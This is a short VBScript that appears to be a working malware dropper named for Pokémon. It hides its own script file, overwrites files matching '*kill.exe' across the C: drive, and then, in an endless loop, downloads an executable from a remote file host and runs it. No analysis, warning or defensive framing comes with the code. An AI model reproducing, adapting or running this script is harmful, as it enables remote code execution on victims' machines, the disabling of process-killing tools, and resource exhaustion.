Dim max,min
Dim list
Set list = CreateObject("System.Collections.ArrayList")
	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee
	list.Add "http://a.pomf.cat/utoojo.exe"        'installer
	list.Add "https://a.pomf.cat/ayunww.bat"	   'the equalizer

names = "C:\eevee.exe"
i = 0
Set oShell = WScript.CreateObject ("WScript.Shell")
oShell.run "cmd.exe /c attrib +h allThePokemans.vbs"
oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (*kill.exe) do echo .> ""%i"" START"

Do While i <= 0
	max=999999999
	min=100000000
	Randomize
	strHDLocation = (Int((max-min+1)*Rnd+min))&".exe"
	
	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.open "GET", list.Item(i), false
    objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then

    Set objADOStream = CreateObject("ADODB.Stream")
	objADOStream.Open
	objADOStream.Type = 1 

	objADOStream.Write objXMLHTTP.ResponseBody
	objADOStream.Position = 0    
	Set objFSO = Createobject("Scripting.FileSystemObject")
	If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
	Set objFSO = Nothing

	objADOStream.SaveToFile strHDLocation
	objADOStream.Close
	Set objADOStream = Nothing
	End if

	Set objXMLHTTP = Nothing
	CreateObject("WScript.Shell").Run strHDLocation
Loop
